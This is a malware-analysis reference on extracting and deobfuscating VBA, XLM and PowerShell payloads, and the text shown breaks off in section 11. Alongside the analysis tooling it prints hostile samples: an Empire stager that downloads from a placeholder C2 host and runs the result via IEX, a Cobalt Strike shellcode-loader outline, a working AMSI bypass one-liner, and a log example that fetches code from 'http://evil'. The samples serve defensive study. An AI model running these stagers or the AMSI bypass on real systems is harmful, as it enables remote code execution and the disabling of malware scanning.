# VBA Macro & PowerShell Script Reverse Engineering

**Reference document for malware analysts and reverse engineers.**

---

## Table of Contents

1. [VBA Macro Extraction from Office Documents](#1-vba-macro-extraction-from-office-documents)
2. [VBA Decompilation Tools](#2-vba-decompilation-tools)
3. [VBA Stomping & P-Code Analysis](#3-vba-stomping--p-code-analysis)
4. [Macro Obfuscation Techniques](#4-macro-obfuscation-techniques)
5. [XLM (Excel 4.0) Macros](#5-xlm-excel-40-macros)
6. [PowerShell Script Analysis](#6-powershell-script-analysis)
7. [PowerShell Obfuscation & Deobfuscation](#7-powershell-obfuscation--deobfuscation)
8. [PowerShell Empire & Cobalt Strike Payload Reversing](#8-powershell-empire--cobalt-strike-payload-reversing)
9. [AMSI Bypass Analysis](#9-amsi-bypass-analysis)
10. [Embedded PE Extraction from Scripts](#10-embedded-pe-extraction-from-scripts)
11. [Detection & Logging Evasion](#11-detection--logging-evasion)
12. [References](#12-references)

---

## 1. VBA Macro Extraction from Office Documents

### 1.1 OLE2 / Compound File Binary Format

Microsoft Office documents prior to Office 2007 (`.doc`, `.xls`, `.ppt`) use the OLE2 format, also known as Compound File Binary Format (CFBF) or Structured Storage. This is a filesystem-within-a-file: a hierarchy of storage objects and stream objects [1](https://github.com/decalage2/oletools/wiki).

Key streams for VBA macro extraction:

| Stream | Purpose |
|--------|---------|
| `_VBA_PROJECT_CUR` | VBA project metadata, references, module table |
| `VBA/ThisDocument` | Compiled p-code + compressed source for the document module |
| `VBA/_VBA_PROJECT` | Project properties, engine version, LCID |
| `VBA/dir` | Module directory — names, offsets, stream indices |
| `VBA/Module1`, `VBA/Module2`, ... | Per-module streams containing compressed source + p-code |
| `VBA/__SRP_*` | Performance cache (p-code only, no source) |

The `VBA/dir` stream is a critical index: it lists every module by name, type, and byte offset into its corresponding stream. Parsing it correctly is essential for extracting individual macros [1](https://github.com/decalage2/oletools/wiki).

### 1.2 OpenXML (OOXML) Format

Office 2007+ formats (`.docx`, `.xlsx`, `.pptm`) are ZIP archives containing XML files. VBA macros live inside a `vbaProject.bin` embedded in the archive:

```
word/document.xml
word/vbaProject.bin     ← OLE2 container embedded in ZIP
[_VBA_PROJECT_CUR]
[_VBA_PROJECT]
[VBA/dir]
[VBA/Module1]
...
```

The `vbaProject.bin` is itself an OLE2 container, so all OLE2 extraction tools apply after unwrapping the ZIP layer [7](https://www.aldeid.com/wiki/Python-oletools/olevba).

### 1.3 Manual Extraction (Low-Level)

```python
import olefile
import struct

ole = olefile.OleFileIO('document.doc')
# Read the directory stream
data = ole.openstream(['VBA', 'dir']).read()
# Parse module records — each is 4 bytes type + 4 bytes offset + name
i = 0
while i < len(data):
    rec_type = struct.unpack_from('<H', data, i)[0]
    rec_len  = struct.unpack_from('<H', data, i+2)[0]
    # ...parse per record type
    i += 4 + rec_len
```

### 1.4 Compressed Source Code

VBA source code within module streams is compressed using a proprietary algorithm (a variant of LZSS). The compression is documented in the `[MS-OVBA]` specification [3](https://github.com/decalage2/oletools/wiki). Tools like `olevba` handle decompression automatically, but manual decompression requires:

1. Decompress the `CompressedSourceCode` field in the module stream
2. Apply token decompression (VBA keywords are stored as single-byte tokens)
3. Reconstruct line structure from the decompressed bytecode

---

## 2. VBA Decompilation Tools

### 2.1 oletools (decalage2)

The de facto standard suite for Office document analysis, written in Python [2](https://github.com/decalage2/oletools/wiki).

| Tool | Function |
|------|----------|
| `oleid` | Detect OLE characteristics (macros, encryption, external links) |
| `olemeta` | Extract OLE metadata |
| `oleobj` | Extract embedded objects |
| `olevba` | Extract and analyze VBA source code |
| `oledump` | Stream-by-stream hex dump |
| `rtfobj` | Extract OLE objects from RTF |
| `msodde` | Detect DDE links |

**olevba** is the primary macro analysis tool:

```bash
# Extract and analyze macros
olevba -a malicious.doc

# Deobfuscate strings automatically
olevba -a --decode malicious.doc

# Generate a detailed report with IOCs
olevba -a --reveal malicious.doc
```

`olevba` provides:
- Decompressed VBA source code extraction
- Auto-execute macro detection (`AutoOpen`, `Document_Open`, `Workbook_Open`)
- Suspicious API call identification (`CreateObject`, `WinHttpRequest`, `Shell`)
- String deobfuscation via pattern matching
- IOC extraction (URLs, IPs, file paths) [7](https://www.aldeid.com/wiki/Python-oletools/olevba)

### 2.2 pcodedmp

A VBA p-code disassembler by Dr. Vesselin Bontchev [3](https://github.com/bontchev/pcodedmp). Unlike `olevba` which reads decompressed source code, `pcodedmp` disassembles the compiled p-code directly.

```bash
pcodedmp malicious.doc
```

This is critical for **VBA stomping** attacks where the source code has been deliberately corrupted or removed but p-code remains intact. pcodedmp reads the performance cache entries (`__SRP_*` streams) and produces a disassembly of every p-code instruction.

### 2.3 ViperMonkey

A VBA parser and emulation engine by decalage2 [4](https://github.com/decalage2/ViperMonkey). It goes beyond static extraction to emulate VBA execution, revealing behaviors that purely static analysis misses.

```bash
vipermonkey -f malicious.doc --emulate
```

Features:
- VBA grammar parser (ANTLR-based)
- Behavioral emulation with sandboxed environment
- String deobfuscation via emulation
- URL extraction from dynamically constructed strings
- API call tracing

### 2.4 ExcelParser / XLMMacroDeobfuscator

For Excel 4.0 (XLM) macros specifically [11](https://github.com/nccgroup/Excel4-DCOM). These tools parse the binary Excel record stream and reconstruct XLM formula expressions:

- **XLMMacroDeobfuscator** by Dissect Malware: deobfuscates XLM formulas, simulates `EXEC`, `CALL`, `REGISTER` calls
- **ExcelParser**: extracts and decodes the BIFF (Binary Interchange File Format) records containing XLM formulas

### 2.5 Other Notable Tools

| Tool | Purpose |
|------|---------|
| `oledump.pl` | Perl-based stream extraction and analysis |
| `PyOLECF` | Python library for OLE2 parsing |
| `OfficeDissector` | Ruby-based Office document analyzer |
| `punycode` | Detects punycode/IDN homoglyph attacks in macros |

---

## 3. VBA Stomping & P-Code Analysis

### 3.1 What Is VBA Stomping?

VBA stomping is an evasion technique that destroys or replaces the VBA source code in a document while keeping the compiled p-code intact [5](https://medium.com/walmartglobaltech/vba-stomping-advanced-maldoc-techniques-612c484ab278). When Office opens the document, if the architecture and version match the original compilation environment, it executes the p-code directly — ignoring the corrupted source.

This means:
- `olevba` or source-based analysis sees benign or garbage code
- The actual malicious logic executes from p-code
- Only p-code disassembly (`pcodedmp`) reveals the true behavior

### 3.2 P-Code Execution Flow

```
Document Opened
    ↓
VBA Runtime loads module stream
    ↓
Check _VBA_PROJECT version vs. Office version
    ↓
Match? → Execute p-code from PerformanceCache
No match? → Decompress source → Recompile → Execute
```

When versions don't match, Office decompresses the source and recompiles, effectively purging the malicious p-code. This is why stomped documents often target specific Office builds [5](https://medium.com/walmartglobaltech/vba-stomping-advanced-maldoc-techniques-612c484ab278).

### 3.3 Performance Cache Structure

The `__SRP_` streams in VBA module storage contain:
- **Compiled p-code** (the executable bytecode)
- **Line number tables** (maps source lines to p-code offsets)
- **Debug information** (variable names, breakpoint data)

Tools like `pcodedmp` parse these to reconstruct the instruction stream [3](https://github.com/bontchev/pcodedmp).

### 3.4 P-Code Instruction Set

VBA p-code is a stack-based intermediate language. Key instruction categories:

| Category | Examples |
|----------|----------|
| Literal push | `LitI2`, `LitI4`, `LitStr`, `LitR8`, `LitVar` |
| Variable access | `Ld`, `St`, `LdLc`, `LdRf` |
| Arithmetic | `Add`, `Sub`, `Mul`, `Div`, `Mod` |
| Comparison | `Eq`, `Ne`, `Lt`, `Gt`, `Le`, `Ge` |
| Branching | `Branch`, `BranchF`, `BranchT`, `GoSub` |
| Object/COM | `Set`, `GetObj`, `SetObj`, `CallI` |
| Arrays | `LdVarg`, `StVarg`, `ARef` |
| Type conversion | `CStr`, `CInt`, `CVar`, `CBool` |

Example pcodedmp output:

```
0056: LitStr "WinHttp.WinHttpRequest.5.1"
005B: Ld R0
005D: Set
005E: Ld R0
0060: LitStr "Open"
0065: ArgsCall (Call) 0
006A: LitStr "GET"
006F: Ld str_001
0074: ArgsCall (Call) 2
```

### 3.5 Detection of VBA Stomping

Indicators:
- Mismatch between p-code and decompressed source
- Missing or zero-length `CompressedSourceCode` in module stream
- Orphaned `__SRP_*` streams without matching source
- Version mismatch between `_VBA_PROJECT` and document metadata

Detection tools:
```bash
# Detect stomping with oleid
oleid malicious.doc

# Compare p-code vs source manually
pcodedmp malicious.doc > pcode.txt
olevba malicious.doc > source.txt
# Look for semantic mismatch
```

---

## 4. Macro Obfuscation Techniques

### 4.1 String Obfuscation

| Technique | Example | Deobfuscation |
|-----------|---------|---------------|
| Concatenation | `"po" & "wer" & "shell"` | String reconstruction |
| `Chr()` encoding | `Chr(80) & Chr(111) & Chr(119)` | Evaluate expressions |
| `StrReverse()` | `StrReverse("llehsrewop")` | Reverse known wrappers |
| Hex encoding | `Hex(80) & Hex(111)` | Parse hex pairs |
| Swapped chars | `"powe" + "rshell"` | Pattern matching |
| Split across variables | `a = "pow": b = "ershell": c = a & b` | Variable tracing |

### 4.2 Control Flow Obfuscation

- **Dead code insertion**: Garbage conditional branches that always evaluate predictably
- **Dynamic invocation**: Using `CallByName`, `Application.Run`, `Eval` to indirect calls
- **Nested function calls**: Deeply nested expressions that resolve to simple strings
- **On Error Resume Next**: Suppresses errors from deliberately broken operations used as guards

### 4.3 Anti-Analysis Techniques

| Technique | Description |
|-----------|-------------|
| Sandbox detection | Check screen resolution, uptime, RAM, running processes |
| VM detection | Query `Win32_ComputerSystem` for VMware/VirtualBox artifacts |
| Debugger detection | `Debug.Assert`, timer checks, `IsDebuggerPresent` |
| Conditional execution | Check Office version, locale, username before activating |
| Sleeping | `Application.Wait` or `Sleep` API calls to evade dynamic analysis timers |

### 4.4 Deobfuscation Strategy

Manual deobfuscation workflow [9](https://medium.com/walmartglobaltech/reverse-engineering-an-obfuscated-malicious-macro-3fd4d4f9c439):

```python
import re
import olefile
from oletools.olevba import VBA_Parser

# Extract
vba = VBA_Parser('sample.doc')
vba.parse()

# Deobfuscate patterns
def deobfuscate(code):
    # Rebuild Chr() concatenations
    code = re.sub(r'Chr\((\d+)\)', lambda m: chr(int(m.group(1))), code)
    # Resolve string concatenations
    code = re.sub(r'"([^"]*)"\s*&\s*"([^"]*)"', r'"\1\2"', code)
    # Unwrap StrReverse
    code = re.sub(r'StrReverse\("([^"]*)"\)',
                  lambda m: m.group(1)[::-1], code)
    return code
```

Tools:
- **olevba `--decode`**: Built-in pattern-based deobfuscation
- **ViperMonkey**: Full emulation-based deobfuscation
- **CyberChef**: Recipe-based manual deobfuscation
- **Custom Python scripts**: For novel obfuscation patterns

### 4.5 VBA Purging / Purgalicious

GCP's Purgalicious technique exploits the opposite of stomping: by recompiling p-code on a clean machine, attacker-controlled p-code is replaced with benign recompiled p-code, purging the malicious behavior while keeping the source intact [10](https://cloud.google.com/blog/topics/threat-intelligence/purgalicious-vba-macro-obfuscation-with-vba-purging/).

---

## 5. XLM (Excel 4.0) Macros

### 5.1 Overview

Excel 4.0 (XLM) macros predate VBA and execute via a legacy compatibility layer in modern Excel [11](https://blogs.vmware.com/networkvirtualization/2021/09/symbexcel-bringing-the-power-of-symbolic-execution-to-the-fight-against-malicious-excel-4-macros.html/). They are stored as BIFF (Binary Interchange File Format) records within the worksheet and are harder for AV/EDR to inspect compared to VBA.

XLM macros gained popularity post-2022 after Microsoft began blocking VBA macros from internet-sourced files [12](https://labs.f-secure.com/blog/attack-detection-fundamentals-initial-access-lab-4).

### 5.2 XLM Structure

XLM formulas are stored in BIFF records with specific opcodes:

| BIFF Opcode | Record | Purpose |
|-------------|--------|---------|
| `0x0022` | `LABEL` | Text label (includes formula) |
| `0x0006` | `FORMULA` | Cell formula |
| `0x00A5` | `EXTERNSHEET` | External reference |
| `0x0018` | `NAME` | Named range/macro |
| `0x00BC` | `SHEETPROTECTION` | Sheet protection state |

The macro sheet is identified by the BOUNDSHEET record with the `xlMacro` type flag [13](https://www.reversinglabs.com/blog/excel-40-macros).

### 5.3 Key XLM Functions Used by Malware

| Function | Purpose |
|----------|---------|
| `EXEC()` | Execute a Windows command (like `Shell`) |
| `CALL()` | Call Win32 API functions via DLL |
| `REGISTER()` | Register a DLL function for calling |
| `FOPEN()`/`FREAD()`/`FWRITE()` | File operations |
| `URLDOWNLOAD()` | Download file from URL |
| `COPYPICTURE()` | Screen capture |
| `GOTO()` | Jump to another macro |

### 5.4 XLM Analysis Tools

```bash
# XLMMacroDeobfuscator
python -m xlmmacrodeobfuscator -f malicious.xlsm -x

# olevba (partial XLM support)
olevba -a malicious.xls
```

### 5.5 XLM + AMSI

Microsoft added AMSI support for XLM in 2021, enabling runtime scanning of XLM formulas before execution [14](https://www.microsoft.com/en-us/security/blog/2021/03/03/xlm-amsi-new-runtime-defense-against-excel-4-0-macro-malware/). However, XLM obfuscation (splitting strings across cells, using `FORMULA` with arithmetic obfuscation) can still evade pattern-based detection.

---

## 6. PowerShell Script Analysis

### 6.1 PowerShell Architecture for Reverse Engineers

PowerShell is built on .NET / .NET Core. Scripts are compiled into an AST (Abstract Syntax Tree), then compiled to MSIL (Microsoft Intermediate Language) at execution time. Understanding this pipeline is key to deobfuscation [15](https://arxiv.org/abs/2406.04027).

```
Script text → Tokenizer → Parser (AST) → Compiler (MSIL) → JIT → Execution
```

### 6.2 AST-Based Analysis

PowerShell exposes its AST through the `[System.Management.Automation.Language.Parser]` class, enabling scripted analysis without executing malware.

```powershell
# Parse a script to its AST
$ast = [System.Management.Automation.Language.Parser]::ParseInput(
    (Get-Content -Raw malicious.ps1), [ref]$null, [ref]$null
)

# Walk AST nodes
$ast.FindAll({ $args[0] -is [System.Management.Automation.Language.CommandAst] }, $true)

# Extract string literals
$ast.FindAll({ $args[0] -is [System.Management.Automation.Language.StringConstantExpressionAst] }, $true)
```

Common AST node types in malicious scripts:

| AST Type | Malicious Use |
|----------|---------------|
| `InvokeMemberExpressionAst` | Reflection-based method calling |
| `ConvertExpressionAst` | Type casting for obfuscation |
| `HashtableAst` | Splatting for suspicious parameters |
| `ArrayLiteralAst` | Storing payload fragments |
| `TryStatementAst` | Exception handling around injected code |

### 6.3 Token-Level Analysis

Token analysis before AST construction catches obfuscation that collapses during parsing:

```powershell
$tokens = $null
$errors = $null
[System.Management.Automation.Language.Parser]::ParseInput(
    $script, [ref]$tokens, [ref]$errors
)
$tokens | Where-Object { $_.Kind -eq 'ParameterToken' }
```

### 6.4 Static Analysis with PowerSploit / PSScriptAnalyzer

```powershell
# Invoke-Expression detection
if ($script -match 'IEX|Invoke-Expression') { warn "IEX detected" }

# Base64 decoding
if ($script -match '[A-Za-z0-9+/]{40,}={0,2}') { warn "base64 payload" }

# Detect common malicious cmdlets
$malicious = @('Invoke-Shellcode', 'Invoke-Mimikatz', 'Invoke-ReflectivePEInjection')
```

---

## 7. PowerShell Obfuscation & Deobfuscation

### 7.1 Obfuscation Categories

PowerShell obfuscation operates at multiple levels [16](https://www.offsec.com/offsec/powershell-obfuscation/):

| Level | Technique | Example |
|-------|-----------|---------|
| **Token** | Tick marks, alternate casing | `Inv` + `` ` `` + `oke-Expression` |
| **String** | Concatenation, substrings | `"Inv"+"oke"+"-Ex"+"pression"` |
| **Encoding** | Base64, SecureString | `[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String(...))` |
| **Compression** | GZip/Deflate streams | `[System.IO.Compression.GzipStream]` |
| **Encryption** | XOR, AES, custom | Byte-level XOR before base64 |
| **Variable** | Arbitrary variable names | `$weujkh = 'IEX'` |
| **Control** | Splitting across commands | Piping between layers |
| **Reflection** | .NET reflection calls | `[Reflection.Assembly]::Load()` |

### 7.2 Invoke-Obfuscation Framework

Daniel Bohannon's Invoke-Obfuscation provides a catalog of PowerShell obfuscation techniques [17](https://github.com/danielbohannon/Invoke-obfuscation):

```powershell
# CLI usage
Set-IToken -ScriptPath payload.ps1
Out-ObfuscatedTokenCommand -ScriptBlock { Invoke-Expression "calc.exe" }
```

Obfuscation options:
- **TOKEN**: Insert tick marks, replace keywords with `Get-Variable` calls
- **AST**: Modify AST node types while preserving functionality
- **COMMAND**: Encapsulate in `-Command` parameter with concatenation
- **ENCODING**: Base64, SecureString, Hex encoding variants
- **COMPRESS**: Gzip + base64 wrapping
- **LAUNCHER**: Alternate launch methods (WMI, COM, scheduled tasks)

### 7.3 Deobfuscation Approaches

#### 7.3.1 Pattern-Based Manual Deobfuscation

```python
import re
import base64

script = open('obfuscated.ps1').read()

# Remove tick marks
script = re.sub(r'`', '', script)

# Reconstruct concatenated strings
script = re.sub(r'\$\w+\s*=\s*"([^"]*)"', '', script)

# Decode base64 payloads
b64_pattern = r'"[A-Za-z0-9+/=]{50,}"'
for match in re.finditer(b64_pattern, script):
    try:
        decoded = base64.b64decode(match.group(0).strip('"'))
        print(f"Base64 payload: {decoded[:100]}")
    except:
        pass
```

#### 7.3.2 Automated String Extraction

```powershell
function Get-Strings {
    param([string]$Script)
    $ast = [System.Management.Automation.Language.Parser]::ParseInput(
        $Script, [ref]$null, [ref]$null
    )
    $ast.FindAll({
        $args[0] -is [System.Management.Automation.Language.StringConstantExpressionAst]
    }, $true) | Select-Object -ExpandProperty Value
}
```

#### 7.3.3 Script Execution with Logging

Run the script with ScriptBlock logging enabled, capture ETW events (Event ID 4104), then reconstruct the deobfuscated code from the logs. ScriptBlock logging captures the post-deobfuscation command [22](https://www.sophos.com/en-gb/blog/reconstructing-powershell-scripts-from-multiple-windows-event-logs).

#### 7.3.4 PowerPeeler

PowerPeeler is a dynamic deobfuscation tool that uses AST correlation to identify obfuscated script pieces, then monitors actual execution to recover decoded instructions [15](https://arxiv.org/abs/2406.04027). It achieves ~80% similarity recovery between obfuscated and original scripts.

### 7.4 Common Obfuscation Patterns

**Tick mark insertion:**
```powershell
# Obfuscated
I`nv`oke-`E`x`pre`ss`ion

# Deobfuscated
Invoke-Expression
```

**String rebuild via substring:**
```powershell
# Obfuscated
$s = "I_n_v_o_k_e_-_E_x_p_r_e_s_s_i_o_n"
$c = $s -replace '_',''
& ([ScriptBlock]::Create($c))

# Deobfuscated
Invoke-Expression
```

**Layered compression + base64:**
```powershell
# Obfuscated
$p = [System.Text.Encoding]::UTF8.GetString(
    [System.Convert]::FromBase64String($e)
)
$d = [System.IO.Compression.GzipStream]::new(
    [IO.MemoryStream][Convert]::FromBase64String($p),
    [IO.Compression.CompressionMode]::Decompress
)
IEX ([Text.Encoding]::UTF8.GetString($d.Read()))
```

**Deobfuscation pipeline:**
1. Extract inner base64 blob
2. Decode → Gzip decompress → reveal next stage
3. Repeat until plaintext script recovered

---

## 8. PowerShell Empire & Cobalt Strike Payload Reversing

### 8.1 PowerShell Empire

Empire generates PowerShell-based agents that communicate over HTTP/HTTPS with encrypted C2 channels. The agent is delivered as a PowerShell script that loads into memory without touching disk [19](https://github.com/DfirJos/CnC-detection).

#### 8.1.1 Empire Stager Structure

```powershell
# Empire HTTP stager (deobfuscated pattern)
$client = New-Object System.Net.WebClient
$bytes = $client.DownloadData('http://c2server/path')
$payload = [System.Text.Encoding]::ASCII.GetString($bytes)
$script = [System.Text.Encoding]::UTF8.GetString(
    [Convert]::FromBase64String($payload)
)
# Base64 decode → decompress → execute
$decoded = [System.Convert]::FromBase64String($script)
$ms = New-Object System.IO.MemoryStream($decoded, 0, $decoded.Length)
$stream = New-Object System.IO.Compression.DeflateStream(
    $ms, [System.IO.Compression.CompressionMode]::Decompress
)
$sr = New-Object System.IO.StreamReader($stream)
IEX $sr.ReadToEnd()
```

Key characteristics:
- Stagers download a base64-encoded, deflate-compressed payload
- Payload contains the Empire agent as a PowerShell script block
- Agent uses AES-256 encrypted C2 communication (negotiated key exchange)
- Tasking is base64 + AES encrypted within HTTP(S) response bodies

#### 8.1.2 Reversing Empire Payloads

Extraction workflow:

```python
# 1. Extract base64 from stager
import base64, zlib

payload_b64 = "..."  # extracted from script
payload_raw = base64.b64decode(payload_b64)

# 2. Deflate decompress
try:
    decoded = zlib.decompress(payload_raw, -zlib.MAX_WBITS)
except:
    # Try with standard zlib header
    decoded = zlib.decompress(payload_raw)

# 3. Decode the Empire module structure
# Empire wraps agents in a script block with module metadata
print(decoded.decode('utf-8', errors='replace'))
```

#### 8.1.3 Empire C2 Traffic Analysis

| Artifact | Empire Indicator |
|----------|------------------|
| User-Agent | Customizable, often mimics browsers |
| URI pattern | Configurable (`/admin/get.php`, `/news.php`) |
| POST data | Base64-encoded, AES-encrypted JSON |
| Cookie | Session tracking (customizable) |
| JA3/JA3S hash | HTTP listener defaults produce distinctive fingerprints |

### 8.2 Cobalt Strike PowerShell Beacon

Cobalt Strike's PowerShell payload is a shellcode loader that injects the beacon DLL into memory [20](https://forensicitguy.github.io/inspecting-powershell-cobalt-strike-beacon/).

#### 8.2.1 Beacon Stager Structure

```powershell
# Cobalt Strike PowerShell stager (conceptual layout)
$K = [System.Text.Encoding]::ASCII.GetBytes("...")   # XOR key
$s = New-Object System.IO.MemoryStream(...)           # Shellcode container
$t = [System.Convert]::FromBase64String(...)          # Encoded shellcode

# XOR decode the shellcode
for ($i = 0; $i -lt $t.Length; $i++) {
    $t[$i] = $t[$i] -bxor $K[$i % $K.Length]
}

# Execute shellcode via delegate or Win32 API
$method = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    [System.Runtime.InteropServices.Marshal]::GetFunctionPointer(...)
)
$method.Invoke(...)
```

#### 8.2.2 Shellcode Extraction

```python
import base64, re

script = open('beacon.ps1').read()

# Extract base64 blob
b64_match = re.search(r'FromBase64String\([\'"](([A-Za-z0-9+/=]+))[\'"]\)', script)
if b64_match:
    raw = base64.b64decode(b64_match.group(1))
    # XOR key is typically embedded earlier in script
    with open('shellcode.bin', 'wb') as f:
        f.write(raw)
```

#### 8.2.3 Win32 API Resolution

Cobalt Strike PowerShell payloads resolve Windows APIs dynamically via Reflection to avoid static imports [20](https://forensicitguy.github.io/inspecting-powershell-cobalt-strike-beacon/):

| API | Purpose |
|-----|---------|
| `VirtualAlloc` | Allocate memory for shellcode |
| `CreateThread` | Execute shellcode in a new thread |
| `WaitForSingleObject` | Wait for execution completion |
| `GetProcAddress` | Resolve API addresses dynamically |
| `LoadLibrary` | Load required DLLs |

```powershell
# Dynamic API resolution pattern
$Win32 = Add-Type -memberDefinition @"
[DllImport("kernel32.dll")]
public static extern IntPtr VirtualAlloc(
    IntPtr lpAddress, uint dwSize,
    uint flAllocationType, uint flProtect
);

[DllImport("kernel32.dll")]
public static extern IntPtr CreateThread(
    IntPtr lpThreadAttributes, uint dwStackSize,
    IntPtr lpStartAddress, IntPtr lpParameter,
    uint dwCreationFlags, IntPtr lpThreadId
);
"@ -name "W" -namespace "N" -passthru
```

#### 8.2.4 Beacon Configuration Extraction

Tools like `1768.py` or `CobaltStrikeParser` can extract embedded configuration from beacon shellcode:

```bash
python2 1768.py beacon.bin
```

This reveals:
- C2 server list and ports
- Sleep time + jitter
- User-Agent strings
- HTTP path patterns (GET/POST URIs, metadata URIs)
- DNS beaconing configuration (if present)
- Pipe names for SMB beacons

### 8.3 Shared Payload Reversing Workflow

Regardless of framework, reversing PowerShell payloads follows a consistent pattern [21](https://medium.com/@polygonben/deobfuscating-a-powershell-cobalt-strike-beacon-loader-c650df862c34):

```
1. Extract base64 blob(s) from stager
2. Decode and decompress (Gzip/Deflate)
3. XOR / decrypt if required (key recovery from context)
4. Examine decoded script — extract next stage or C2 config
5. For shellcode: dump raw bytes, analyze with scdbg or Ghidra
6. For .NET assemblies: dump with Out-Minidump, analyze with dnSpy
7. For PowerShell agents: extract module functions and decode C2 tasks
```

---

## 9. AMSI Bypass Analysis

### 9.1 AMSI Architecture

The Anti-Malware Scan Interface (AMSI) is a Windows security feature that allows registered providers to scan script content before execution [23](https://medium.com/@andrew.petrus/breaking-amsi-how-malware-avoids-windows-script-scanning-92e5588cd355).

```
PowerShell script → AMSI API (amsiscanbuffer) → AMSI Provider (e.g. Defender) → Block/Allow
```

AMSI hooks into:
- PowerShell (all versions 5+)
- VBScript / JScript
- VBA macros (Office)
- .NET `ScriptEngine`
- XLM macros (post-2021)

### 9.2 Memory Patching Bypasses

The most common bypass technique patches the `AMSI.DLL` functions in memory [24](https://fluidattacks.com/es/blog/amsi-bypass-python):

```powershell
# Classic AMSI bypass via memory patching
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
    .GetField('amsiInitFailed','NonPublic,Static')
    .SetValue($null, $true)
```

This sets `amsiInitFailed` to `$true`, causing all subsequent AMSI scans to report "clean." Detection relies on:
- PowerShell ScriptBlock logging capturing the patching code
- ETW events showing AmsiInitialize failure
- Memory scanning for known patch signatures

### 9.3 Advanced Bypass Techniques

| Technique | Mechanism | Detection Evasion |
|-----------|-----------|-------------------|
| `amsiInitFailed` patching | Set static field to true | Widely signatured |
| HKCU registry bypass | Disable `EnableScriptBlockLogging` | Requires admin rights |
| D/Invoke patching | Pinvoke `AmsiScanBuffer` via `VirtualProtect` | Harder to detect statically |
| HWBP bypass | Hardware breakpoints to skip AMSI check | No memory modification |
| VEH bypass | Vectored Exception Handler to intercept AMSI calls | No IAT/function patching |
| ScriptBlock Smuggling | Dual AST: one for execution, one for scanning | No memory patches at all |
| ETW patching | Disable ETW via `EtwEventWrite` patching | Hides from logging |

### 9.4 ScriptBlock Smuggling

Discovered in 2024, ScriptBlock Smuggling creates two different AST representations from the same script — one for compiler execution (functional) and one for AMSI/ETW logging (benign-looking) [25](https://www.researchgate.net/publication/379275980_ScriptBlock_Smuggling_Uncovering_Stealthy_Evasion_Techniques_in_PowerShell_and_NET_Environments).

```powershell
# Conceptual: AST divergence via tokenizer differences
# The parser and AMSI see different parse trees
```

This technique is significant because it:
- Bypasses AMSI without any memory patching
- Evades ScriptBlock logging (logged AST differs from executed AST)
- Works on fully patched systems with no CVEs

### 9.5 AMSI Bypass Reversing Checklist

When analyzing a sample that uses AMSI bypasses [26](https://s3cur3th1ssh1t.github.io/Powershell-and-the-.NET-AMSI-Interface/):

1. Identify which bypass technique is used
2. Extract the bypass code (often dropped at script start)
3. Check if bypass uses memory patching (look for `VirtualProtect`)
4. Check if bypass targets `AmsiUtils`, `amsiInitFailed`, or `AmsiScanBuffer`
5. For VEH bypasses: extract the VEH handler code
6. For ScriptBlock Smuggling: analyze the dual AST construction
7. Document whether bypass affects PowerShell only or also .NET assemblies

---

## 10. Embedded PE Extraction from Scripts

### 10.1 Detection of Embedded PEs

Attackers frequently embed portable executables (PEs) inside PowerShell scripts as base64-encoded byte arrays [27](https://www.elastic.co/guide/en/security/current/suspicious-portable-executable-encoded-in-powershell-script.html).

The PE header signature (`MZ` = `0x4D 0x5A`) in base64 appears as:
```
TVqQAAMAAAAEAAAA/...  (base64 of MZ header)
```

Detection methods:
```python
# Detect embedded PE via base64 pattern
import re, base64

PE_HEADER_B64 = r'(?:TVq[0-9A-Za-z+/]{60,})'  
b64_sequences = re.findall(PE_HEADER_B64, script)

for seq in b64_sequences:
    try:
        raw = base64.b64decode(seq)
        if raw[:2] == b'MZ':
            print(f"Embedded PE detected, size: {len(raw)} bytes")
    except: pass
```

### 10.2 Extraction Workflow

```python
# Full extraction
import base64, re, io
import peutils  # pefile

script = open('sample.ps1').read()

# Stage 1: Find all base64 blobs
b64 = re.findall(r'"([A-Za-z0-9+/=]{100,})"', script)

for i, blob in enumerate(b64):
    data = base64.b64decode(blob)
    if data[:2] == b'MZ':
        # Stage 2: Write to disk for analysis
        with open(f'extracted_pe_{i}.exe', 'wb') as f:
            f.write(data)
        
        # Stage 3: Analyze immediately
        try:
            pe = pefile.PE(data=data)
            print(f"  Arch: {pe.FILE_HEADER.Machine}")
            print(f"  Sections: {len(pe.sections)}")
            for s in pe.sections:
                print(f"    {s.Name}: {s.SizeOfRawData} bytes")
        except Exception as e:
            print(f"  PE parse error: {e}")

# Stage 4: Also look for byte array style
byte_arrays = re.findall(
    r'\[Byte\[\]\]\s*@\(([\d,\s]+)\)', script
)
for arr in byte_arrays:
    bytes_data = bytes([int(b.strip()) for b in arr.split(',')])
    if bytes_data[:2] == b'MZ':
        print(f"Byte array PE found, size: {len(bytes_data)}")
```

### 10.3 .NET Assembly Extraction

For reflective .NET assembly loading, the PE is typically a .NET executable (C#/VB.NET compiled binary) [28](https://www.manageengine.com/uk/log-management/detection-rules/powershell-base64-encoded-reflective-assembly-load.html).

```powershell
# Reflective load pattern
$bytes = [System.Convert]::FromBase64String($b64)
$assembly = [System.Reflection.Assembly]::Load($bytes)
$assembly.EntryPoint.Invoke($null, (,[object[]]@()))
```

Extraction:
```python
# Extract .NET assembly and analyze with dnSpy/decompiler
import base64

# Find the reflection load pattern
if '[System.Reflection.Assembly]::Load' in script:
    b64 = extract_nearest_base64(script, 'Assembly::Load')
    dll_bytes = base64.b64decode(b64)
    with open('extracted_assembly.dll', 'wb') as f:
        f.write(dll_bytes)
```

### 10.4 Shellcode Extraction

Shellcode extraction from PowerShell is similar but targets smaller payloads (typically a Metasploit or Cobalt Strike stage):

```python
# Common shellcode patterns in PowerShell
# Byte array of 0-255 values embedded in script
shellcode_pattern = re.compile(
    r'0x[0-9a-fA-F]{2}(?:,\s*0x[0-9a-fA-F]{2}){100,}'
)
for match in shellcode_pattern.finditer(script):
    bytes_data = bytes([
        int(b, 16) for b in re.findall(r'0x([0-9a-fA-F]{2})', match.group())
    ])
    with open('shellcode.bin', 'wb') as f:
        f.write(bytes_data)
```

---

## 11. Detection & Logging Evasion

### 11.1 ScriptBlock Logging

PowerShell 5.0+ enables ScriptBlock logging by default (Event ID 4104). This logs the deobfuscated command text after parsing but before execution [22](https://www.sophos.com/en-gb/blog/reconstructing-powershell-scripts-from-multiple-windows-event-logs).

```xml
<EventID>4104</EventID>
<Data Name="ScriptBlockText">
  Invoke-Expression (New-Object Net.WebClient).DownloadString('http://evil/payload.ps1')
</Data>
```

### 11.2 Logging Evasion Techniques

| Technique | Mechanism | Notes |
|-----------|-----------|-------|
